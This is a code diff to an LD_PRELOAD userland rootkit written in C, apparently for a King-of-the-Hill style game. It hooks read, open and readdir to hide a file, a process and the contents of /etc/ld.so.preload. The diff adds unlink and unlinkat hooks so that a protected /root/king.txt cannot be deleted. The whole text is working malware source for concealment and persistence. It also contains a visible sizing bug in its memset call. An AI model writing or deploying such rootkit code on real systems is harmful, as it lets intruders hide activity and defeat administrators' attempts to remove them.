@@ -12,6 +12,8 @@
 // Original function pointers
 static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;
 static int (*orig_open)(const char *pathname, int flags, ...) = NULL;
+static int (*orig_unlink)(const char *pathname) = NULL;
+static int (*orig_unlinkat)(int dirfd, const char *pathname, int flags) = NULL;
 static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
 
 // Target file and PID to hide
@@ -49,14 +51,17 @@ ssize_t read(int fd, void *buf, size_t count) {
               // Adjust count to message length if necessary
               if (count > msg_len) {
                   count = msg_len;
-              }// ; count = 11;
+              }; count = 11;
 
-              // Copy the message to the buffer
-              // strncpy(buf, message, count);
+              // Replace the message to the buffer.
               // is_reading_hidden_file = 0; // Reset flag after reading
+              memset(buf, 0, sizeof(buf));
+              strncpy(buf, message, count);
+              // buf[len] = -1;
+              // buf[len + 1] = '\0';
               return count; // Return the number of bytes written
            }
-            
+
         }
 
         // Hide the contents of /etc/ld.so.preload
@@ -83,6 +88,36 @@ int open(const char *pathname, int flags, ...) {
     return orig_open(pathname, flags);
 }
 
+// Intercept the unlink system call to prevent deletion
+int unlink(const char *pathname) {
+    if (!orig_unlink) {
+        orig_unlink = dlsym(RTLD_NEXT, "unlink");
+    }
+
+    // Prevent deletion of /root/king.txt
+    if (strcmp(pathname, hidden_file) == 0) {
+        errno = EACCES; // Return permission error to prevent deletion
+        return -1;
+    }
+
+    return orig_unlink(pathname);
+}
+
+// Intercept the unlinkat system call to prevent deletion
+int unlinkat(int dirfd, const char *pathname, int flags) {
+    if (!orig_unlinkat) {
+        orig_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
+    }
+
+    // Prevent deletion of /root/king.txt
+    if (strcmp(pathname, hidden_file) == 0) {
+        errno = EACCES; // Return permission error to prevent deletion
+        return -1;
+    }
+
+    return orig_unlinkat(dirfd, pathname, flags);
+}
+
 // Intercept readdir to hide specific processes
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) {
@@ -97,5 +132,4 @@ struct dirent *readdir(DIR *dirp) {
         }
         return entry; // Return non-hidden entries
     }
-    return NULL;
-}
+    return NULL;}
